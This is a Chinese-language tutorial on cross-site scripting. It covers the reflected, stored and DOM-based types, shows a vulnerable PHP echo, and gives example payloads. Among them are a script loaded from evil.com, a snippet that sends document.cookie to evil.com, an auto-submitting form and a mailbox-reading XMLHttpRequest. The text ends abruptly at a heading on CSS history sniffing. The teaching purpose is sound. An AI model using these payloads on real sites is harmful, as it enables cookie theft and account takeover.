### XSS简介
跨站脚本攻击(Cross Site Script)，通常是指黑客通过`html注入`篡改了网页，插入恶意脚本，从而在用户浏览网页时，控制用户浏览器的一种攻击
```php
<?php
    $input = $_GET['param'];
    echo "<div>".$input
?>
```
在正常情况下，用户向param提交的数据会展示到页面中，比如提交
```html
http://www.a.com/test.php?param=这是一个测试
```
这时页面中会显示`这是一个测试`
但是如果提交了一段HTML代码
```html
http://www.a.com/test.php?param=<script>alert(/xss/)</script>
```
这时会在页面中显示`<div><script>alert(/xss/)</script><div>`，这显然是开发者不希望看到的
三种类型的XSS:
1. 反射型XSS
将输入数据`反射`给浏览器。也就是说，黑客往往需要诱导用户点击一个恶意链接，才能攻击成功
2. 存储型XSS
把用户输入的数据存储到服务端。这种XSS具有很强的稳定性
3. DOM BASED XSS
通过修改页面的DOM节点形成的XSS，称之为DOM BASED XSS
```html
<script>
function test(){
    var str = document.getElementById("text").value;
    document.getElementById("t").innerHTML = "<a href='"+str+"'>testLink</a>";
}
</script>
<div id="t"></div>
<input type="text" id="text" value="" />
<input type="button" id="s" value="write" onclick="test()" />
```

### XSS攻击进阶
用以完成各种具体功能的恶意脚本，被称为`XSS Payload`
一个最常见的XSS Payload就是通过读取浏览器的`Cookie`对象，从而发起`Cookie劫持`攻击
Cookie中一般加密保存了当前用户登录凭证。Cookie如果丢失。换句话说攻击者可以不通过密码。而直接登录进用户的账户
比如上面的例子中如果用户输入下面的
```html
http://www.a.com/test.html?abc="><script src=http://www.evil.com/evil.js></script>
```
真正的XSS Payload写在这个远程脚本中，避免直接在URL的参数里写入大量的JS代码
```js
var img = document.createElement("img");
img.src="http://www.evil.com/log?" + escape(document.cookie);
document.body.appendChild(img);
```
`Cookie劫持`并非所有的时候都会有效。有的网站可能会在Set-Cookie时给关键Cookie植入HttpOnly的标识；有的网站可能会把Cookie与客户端IP绑定，从而使得XSS窃取Cookie失去意义
模拟一个POST请求
```js
var dd = document.createElement("div");
document.body.appendChild(dd);
dd.innerHTML = `<form action="" method="post" id="xssform" name="mbform">
    <input type="hidden" value="JIUY" name="ck">
    <input type="text" value="testtest" name="mb_text">
</form>`;
document.getElementById('xssform').submit();
```
上面的代码自动模拟表单提交代码，自动提交表单
攻击者除了可以实施cookie劫持外，还能通过模拟GET, POST请求操作用户浏览器
```js
if(top.window.location.href.indexOf("sid=") > 0){
    var sid = top.window.location.href.substr(top.window.location.href.indexOf("sid=")+4, 24);
    var folder_url = "http://"+top.window.location.host+"/cfg-bin/mail_list?folderid=1&page=0&s=inbox&sid="+sid;
    var ajax = null;
    if(window.XMLHttpRequest){
        ajax = new XMLHttpRequest();
    }else if(window.ActiveXObject){
        ajax = new ActiveXObject("Microsoft.XMLHTTP");
    }else{
        return;
    }
}
ajax.open("GET", folder_url, true);
ajax.send(null);
ajax.onreadystatechange = function(){
    if(ajax.readyState == 4 && ajax.status == 200){
        alert(ajax.responsText);
    }
}
```
当有图片验证码时，XSS Payload可以通过读取页面内容，将验证码URL发送到远程服务器上来实施--攻击者可以在远程XSS后台接受当前验证码，并将验证码的值返回给前台的XSS Payload，从而绕过验证码

通过CSS来发现一个用户曾经访问过的网站















